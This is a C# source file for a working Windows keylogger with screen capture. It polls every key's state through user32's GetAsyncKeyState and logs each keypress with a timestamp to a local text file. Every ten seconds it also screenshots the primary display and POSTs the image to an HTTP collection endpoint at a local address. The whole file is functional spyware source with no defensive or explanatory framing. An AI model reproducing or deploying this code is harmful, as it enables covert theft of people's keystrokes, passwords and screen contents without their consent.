namespace Console.Keylogger
{
    using System;
    using System.Drawing;
    using System.IO;
    using System.Net;
    using System.Net.Http;
    using System.Net.Http.Formatting;
    using System.Net.Http.Headers;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;

    public class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            var keyloggerTask = Task.Run(() => StartKeylogger());
            var snapshotsTask = Task.Run(() => StartSnapshots());

            Task.WaitAll(keyloggerTask, snapshotsTask);
        }

        private static void StartKeylogger()
        {
            var exeDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            var logFilePath = $"{exeDirectory}/KeysPressed.txt";

            using (StreamWriter writer = new StreamWriter(logFilePath))
            {
                writer.AutoFlush = true;

                while (true)
                {
                    // Putting the process to sleep every 10 ms, 
                    // In order to prevent it from eating our CPU
                    Thread.Sleep(15);

                    for (Int32 i = 0; i < 255; i++)
                    {
                        var keyState = GetAsyncKeyState(i);

                        // If keyState == 1 -> the most insignificant bit is set to 1
                        // If keyState == -32767 -> the most significant bit is set to 1
                        // Both states mean that the key with number "i" has been pressed
                        if (keyState == 1 || keyState == -32767)
                        {
                            var key = (Keys)i;

                            // This check is done so that we don't log the mouse button clicks
                            // Remove this check if you want to get the mouse clicks also
                            if (key != Keys.LButton && key != Keys.RButton)
                            {
                                writer.WriteLine($"[{DateTime.Now}] - {key}");
                            }
                        }
                    }
                }
            }
        }

        private async static Task StartSnapshots()
        {
            var primaryScreenBounds = Screen.PrimaryScreen.Bounds;
            var primaryScreenWidth = primaryScreenBounds.Width;
            var primaryScreenHeight = primaryScreenBounds.Height;

            var currentDate = default(DateTime);
            var currentTime = default(TimeSpan);
            var fileName = default(String);

            using (var bitmapScreenCapture = new Bitmap(primaryScreenWidth, primaryScreenHeight))
            {
                using (var graphics = Graphics.FromImage(bitmapScreenCapture))
                {
                    while (true)
                    {
                        graphics.CopyFromScreen(
                            primaryScreenBounds.X,
                            primaryScreenBounds.Y,
                            0, 0,
                            bitmapScreenCapture.Size,
                            CopyPixelOperation.SourceCopy);

                        //currentDate = DateTime.Now;
                        //currentTime = currentDate.TimeOfDay;

                        //fileName = $"{currentDate.Year}-{currentDate.Month}-{currentDate.Day}({currentTime.Hours}-{currentTime.Minutes}-{currentTime.Seconds}).jpeg";

                        var imageAsByteArray = ConvertionOperations.ImageToByteArray(bitmapScreenCapture);
                        await SendRequestAsync(imageAsByteArray);

                        Thread.Sleep(10000);
                    }
                }
            }
        }

        public static async Task SendRequestAsync(byte[] requestData)
        {
            using (var client = new HttpClient())
            {
                // Set the API base address
                client.BaseAddress = new Uri("http://localhost:62164/");

                // Set the Accept header for BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using the BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync("api/Images/Receive", requestData, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
